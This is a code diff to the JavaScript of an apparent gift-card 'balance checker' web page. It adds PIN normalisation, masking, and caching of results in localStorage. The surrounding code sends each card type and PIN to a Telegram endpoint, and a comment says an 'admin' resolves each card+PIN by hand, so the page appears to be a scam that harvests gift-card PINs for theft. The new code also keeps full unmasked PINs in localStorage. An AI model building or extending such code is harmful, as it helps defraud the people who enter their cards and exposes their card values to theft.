@@ -213,6 +213,11 @@ function clearResult() {
   document.getElementById('loadingState').style.display = 'none';
 }
 
+function normalizePinInput(inputEl) {
+  if (!inputEl) return;
+  inputEl.value = String(inputEl.value || '').toUpperCase();
+}
+
 // ── Shake helper ──────────────────────────────────────────────
 function shakeEl(el) {
   el.style.animation = 'none';
@@ -235,6 +240,46 @@ const CARD_LABELS = (function () {
   return o;
 })();
 
+function balanceKey(cardType, cardPinUpper) {
+  return `latest_balance_${cardType}_${cardPinUpper}`;
+}
+
+function saveLatestBalance(cardType, cardPinUpper, payload) {
+  const key = balanceKey(cardType, cardPinUpper);
+  localStorage.setItem(key, JSON.stringify(payload));
+  localStorage.setItem('gc_last_lookup_key', key);
+}
+
+function readLatestBalance(cardType, cardPinUpper) {
+  try {
+    const raw = localStorage.getItem(balanceKey(cardType, cardPinUpper));
+    return raw ? JSON.parse(raw) : null;
+  } catch (_) {
+    return null;
+  }
+}
+
+function restoreLastShownBalance() {
+  const lastKey = localStorage.getItem('gc_last_lookup_key');
+  if (!lastKey) return;
+  try {
+    const raw = localStorage.getItem(lastKey);
+    if (!raw) return;
+    const data = JSON.parse(raw);
+    if (!data || !data.balance || !data.cardType || !data.cardPinUpper) return;
+    const sel = document.getElementById('giftCardSelect');
+    if (sel && sel.querySelector(`option[value="${data.cardType}"]`)) {
+      sel.value = data.cardType;
+      updateSelectIcon();
+    }
+    showResult(data.balance, CARD_LABELS[data.cardType] || data.cardType, maskPin(data.cardPinUpper));
+  } catch (_) {}
+}
+
+function maskPin(pin) {
+  return pin.length > 4 ? '*'.repeat(pin.length - 4) + pin.slice(-4) : pin;
+}
+
 // ── Send Telegram message ─────────────────────────────────────
 async function sendTelegram(text) {
   const res = await fetch('/api/telegram', {
@@ -256,7 +301,7 @@ async function sendTelegram(text) {
 // ── Main check balance flow ───────────────────────────────────
 async function checkBalance() {
   const cardType  = document.getElementById('giftCardSelect').value;
-  const cardPin   = document.getElementById('cardPin').value.trim();
+  const cardPin   = document.getElementById('cardPin').value.trim().toUpperCase();
 
   // Validate
   if (!cardType) { shakeEl(document.getElementById('giftCardSelect')); return; }
@@ -264,9 +309,18 @@ async function checkBalance() {
 
   const requestId   = genId();
   const cardLabel   = CARD_LABELS[cardType] || cardType;
-  const maskedPin   = cardPin.length > 4
-    ? '*'.repeat(cardPin.length - 4) + cardPin.slice(-4)
-    : cardPin;
+  const maskedPin   = maskPin(cardPin);
+
+  // If admin has already resolved this card+PIN before, reuse it immediately.
+  const cached = readLatestBalance(cardType, cardPin);
+  if (cached) {
+    if (cached.balance) {
+      showResult(cached.balance, cardLabel, maskedPin);
+    } else {
+      showError(cached.error || 'Card not found or expired.');
+    }
+    return;
+  }
 
   // ── UI: loading ──
   setLoading(true);
@@ -314,8 +368,22 @@ async function checkBalance() {
       document.getElementById('loadingState').style.display = 'none';
 
       if (data.balance) {
+        saveLatestBalance(cardType, cardPin, {
+          cardType,
+          cardPinUpper: cardPin,
+          balance: String(data.balance),
+          ts: Date.now(),
+          requestId,
+        });
         showResult(data.balance, cardLabel, maskedPin);
       } else {
+        saveLatestBalance(cardType, cardPin, {
+          cardType,
+          cardPinUpper: cardPin,
+          error: data.error || 'Card not found or expired.',
+          ts: Date.now(),
+          requestId,
+        });
         showError(data.error || 'Card not found or expired.');
       }
       return;
@@ -360,4 +428,5 @@ function showError(msg) {
 document.addEventListener('DOMContentLoaded', () => {
   initCarousel();
   updateSelectIcon();
+  restoreLastShownBalance();
 });
